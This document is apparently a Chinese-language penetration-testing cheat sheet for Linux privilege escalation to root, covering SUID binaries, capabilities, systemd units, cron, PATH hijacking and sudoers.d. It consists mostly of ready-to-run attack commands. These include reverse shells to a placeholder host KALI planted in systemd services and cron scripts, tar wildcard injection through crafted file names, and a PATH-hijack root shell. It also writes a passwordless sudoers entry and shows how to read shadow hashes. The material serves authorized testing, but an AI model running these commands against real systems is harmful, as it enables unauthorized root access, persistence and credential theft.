# SUID / capabilities / systemd / cron / PATH

> **TECH：** 文件权限、capability、定时器与 PATH/加载器劫持  
> **IMPACT：** uid=0  
> **成功：** root shell，不是“找到一个 SUID find”

GTFOBins 命令见 `gtfobins-common.md`。本文件补 **systemd、cron、PATH、通配符、可写解释器包装**。

---

## 1. SUID / SGID

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
ls -l /usr/bin/passwd /usr/bin/sudo /usr/bin/pkexec
```

标准 `passwd/sudo/su/mount` 不是漏洞。重点：`find/vim/python/nmap/bash/env/cp/chmod` 以及 **自定义业务二进制**。

自定义：

```bash
strings /opt/app/suidbin
ldd /opt/app/suidbin
strace -f /opt/app/suidbin 2>&1 | head
```

调用 `service` / `systemctl` / `tar` 等相对路径 → 第 5 节 PATH。可写脚本被 SUID 包装器调用 → 写 payload。

---

## 2. capabilities

```bash
getcap -r / 2>/dev/null
```

| cap | 动作 |
|---|---|
| cap_setuid+ep | 解释器 `os.setuid(0)` |
| cap_setgid+ep | 进 root 组，通常还要配合读 shadow |
| cap_dac_read_search | 读 /etc/shadow、ssh key、cloud cred |
| cap_dac_override | 写 passwd/sudoers/cron |
| cap_sys_admin | mount/overlay/user ns，接近逃逸 |
| cap_sys_ptrace | 往 root 进程注入（有时被 Yama 拦） |
| cap_sys_module | 加载内核模块 → root；现代 kernel 常禁 |

`cap_dac_read_search` 读到 root 哈希后离线打出来，再用密码 `su`/`sudo`。这仍算本模块成功。

---

## 3. systemd unit / timer（优先于只看 cron）

```bash
systemctl list-timers --all
systemctl list-units --type=service --state=running
ls -l /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system
find /etc/systemd /lib/systemd -writable 2>/dev/null
```

可写 service：

```bash
cp /etc/systemd/system/backup.service /tmp/backup.service.bak
# ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'
systemctl daemon-reload
systemctl restart backup
```

可写 drop-in：

```bash
mkdir -p /etc/systemd/system/backup.service.d
cat > /etc/systemd/system/backup.service.d/override.conf << 'EOF'
[Service]
ExecStart=
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'
EOF
systemctl daemon-reload
systemctl restart backup
```

`sudo systemctl` 允许 `edit`/`start`/`daemon-reload` → GTFOBins systemd 路径。

用户 lingering 定时器：

```bash
loginctl show-user "$USER" -p Linger
ls -l ~/.config/systemd/user
```

只有 user 级 systemd 不够 root。需要系统级 unit 或 root 的 timer。

RESTORE：拷回 bak，删 drop-in，`systemctl daemon-reload && systemctl restart <svc>`。

---

## 4. cron

```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron /var/spool/cron/crontabs
crontab -l
./pspy64
```

root cron 跑的脚本可写：

```bash
cp /usr/local/bin/backup.sh /tmp/backup.sh.bak
echo 'bash -i >& /dev/tcp/KALI/4444 0>&1' >> /usr/local/bin/backup.sh
```

等 pspy 里出现 root 执行，或 crontab 的下一分钟。

### 通配符注入（tar）

cron：`cd /data && tar czf /backup/bak.tar.gz *`

```bash
cd /data
echo 'bash -i >& /dev/tcp/KALI/4444 0>&1' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

RESTORE：删 `--checkpoint*` 和 `shell.sh`，脚本从 bak 恢复。

---

## 5. PATH 劫持

SUID 或 root cron 调用裸命令：

```bash
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/opt/app/suidbin
```

cron 的 PATH 在 crontab 头。可写的 cron PATH 目录里放同名二进制。

---

## 6. 通配 / 可写解释器包装

```bash
ls -l /usr/local/bin /opt
find /usr/local /opt /home -writable -type f 2>/dev/null | head
```

root 用 `python3 /opt/app/job.py` 且 `job.py` 或同目录可写 `.py` → 插入 `os.system`。  
`PYTHONPATH` / 可写 `site-packages` 同理。

```bash
python3 -c 'import sys;print("\n".join(sys.path))'
```

---

## 7. NFS 以外的写 passwd

已在 SKILL 第 5 节。这里补 **可写 /etc/sudoers.d**：

```bash
echo 'USER ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/99-user
chmod 440 /etc/sudoers.d/99-user
sudo -i
```

RESTORE：删该文件。错误语法会让 sudo 全面拒绝，写之前 `visudo -c -f /etc/sudoers.d/99-user`（若当前已能跑 visudo）。普通用户写完若 sudo 挂了，notes 必须写明。
